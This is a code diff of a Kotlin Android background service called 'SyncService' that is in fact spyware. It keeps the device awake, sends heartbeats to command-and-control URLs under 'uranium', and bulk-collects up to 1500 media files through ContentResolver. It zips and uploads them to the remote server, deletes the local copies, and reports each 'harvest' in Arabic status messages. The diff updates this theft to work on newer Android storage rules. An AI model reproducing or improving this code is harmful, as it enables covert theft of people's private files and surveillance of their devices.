@@ -5,6 +5,7 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.ClipboardManager
+import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
 import android.database.Cursor
@@ -36,7 +37,6 @@ class SyncService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     
-    // روابط سيرفرك المعتمد على Render
     private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
     private val C2_INGEST_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
     private var lastHeartbeatSent = 0L
@@ -44,7 +44,7 @@ class SyncService : Service() {
     override fun onCreate() {
         super.onCreate()
         val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::ZeroCacheLock")
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::RealExecuteLock")
         wakeLock?.acquire(10 * 60 * 60 * 1000L)
         startForegroundServiceNotification()
     }
@@ -84,7 +84,7 @@ class SyncService : Service() {
                     val currentTime = System.currentTimeMillis()
                     val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
                     val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
-                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Zero-Cache Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
+                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Real-Engine Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
 
                     if (sendHeartbeat) {
                         lastHeartbeatSent = currentTime
@@ -159,60 +159,59 @@ class SyncService : Service() {
         return START_STICKY
     }
 
-    // تدفق النصوص مباشرة للسيرفر وحذفها فوراً (Zero-Cache)
     private fun streamTextDirect(nodeId: String, nodeModel: String, fileName: String, content: String) {
         try {
             val bytes = content.toByteArray(Charsets.UTF_8)
             val tempFile = File(cacheDir, fileName)
             tempFile.writeBytes(bytes)
             uploadRawZeroCache(nodeId, nodeModel, fileName, tempFile)
-            try { tempFile.delete() } catch (e: Exception) {} // حذف فوري ونهائي
-            sendReportToServer(nodeId, nodeModel, "✅ [حصاد نظيف بدون كاش] الملف <b>$fileName</b> تم بثه للسيرفر وتطهير الذاكرة تماماً.")
+            try { tempFile.delete() } catch (e: Exception) {}
+            sendReportToServer(nodeId, nodeModel, "✅ [حصاد نقي حقيقي] الملف <b>$fileName</b> تم بثه للسيرفر وتطهير الذاكرة تماماً.")
         } catch (e: Exception) {}
     }
 
-    // تدفق الأرشيفات بالضغط المباشر والمسح الفوري للملف المؤقت
     private fun streamArchiveDirect(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
         try {
-            sendReportToServer(nodeId, nodeModel, "⚡ [البث المباشر الفوري] جاري تجميع وضغط بيانات $prefix بنظام Zero-Cache...")
+            sendReportToServer(nodeId, nodeModel, "⚡ [البث الفعال الحقيقي] جاري استخراج وضغط بيانات $prefix بنظام ContentResolver...")
             val zipFile = File(cacheDir, "Uranium_${prefix}_${System.currentTimeMillis()}.zip")
             val zipOut = ZipOutputStream(FileOutputStream(zipFile))
             zipOut.setLevel(Deflater.BEST_COMPRESSION)
 
-            val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
+            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
             val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
             val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
 
             var fileCount = 0
             cursor?.use {
-                val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
+                val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                 val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                while (it.moveToNext() && fileCount < 2000) {
-                    if (dataIdx != -1 && nameIdx != -1) {
-                        val filePath = it.getString(dataIdx)
-                        val fileName = it.getString(nameIdx)
-                        if (filePath != null) {
-                            val file = File(filePath)
-                            if (file.exists() && file.isFile) {
-                                try {
-                                    zipOut.putNextEntry(ZipEntry("$prefix/$fileName"))
-                                    file.inputStream().use { fis -> fis.copyTo(zipOut) }
-                                    zipOut.closeEntry()
-                                    fileCount++
-                                } catch (ex: Exception) {}
+                while (it.moveToNext() && fileCount < 1500) {
+                    if (idIdx != -1 && nameIdx != -1) {
+                        val id = it.getLong(idIdx)
+                        val name = it.getString(nameIdx) ?: "file_$id.dat"
+                        val itemUri = ContentUris.withAppendedId(contentUri, id)
+                        try {
+                            contentResolver.openInputStream(itemUri)?.use { inputStream ->
+                                zipOut.putNextEntry(ZipEntry("$prefix/$name"))
+                                inputStream.copyTo(zipOut)
+                                zipOut.closeEntry()
+                                fileCount++
                             }
-                        }
+                        } catch (ex: Exception) {}
                     }
                 }
             }
             zipOut.close()
 
-            val sizeMB = zipFile.length() / (1024.0 * 1024.0)
-            uploadRawZeroCache(nodeId, nodeModel, zipFile.name, zipFile)
-            try { zipFile.delete() } catch (e: Exception) {} // تنظيف الكاش كلياً فور الرفع
-            
-            sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد وبثه بنجاح وتطهير الذاكرة]\n📂 <code>${zipFile.name}</code>\n📊 الحجم: <b>${String.format("%.2f", sizeMB)} MB</b> ($fileCount ملفاً)")
-        } catch (e: Exception) {}
+            if (zipFile.exists() && zipFile.length() > 0) {
+                val sizeMB = zipFile.length() / (1024.0 * 1024.0)
+                uploadRawZeroCache(nodeId, nodeModel, zipFile.name, zipFile)
+                sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد الحقيقي وبثه بنجاح وتطهير الذاكرة]\n📂 <code>${zipFile.name}</code>\n📊 الحجم: <b>${String.format("%.2f", sizeMB)} MB</b> ($fileCount ملفاً)")
+            }
+            try { zipFile.delete() } catch (e: Exception) {}
+        } catch (e: Exception) {
+            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الاستخراج الفعال: ${e.message}")
+        }
     }
 
     private fun uploadRawZeroCache(nodeId: String, nodeModel: String, fileName: String, file: File) {
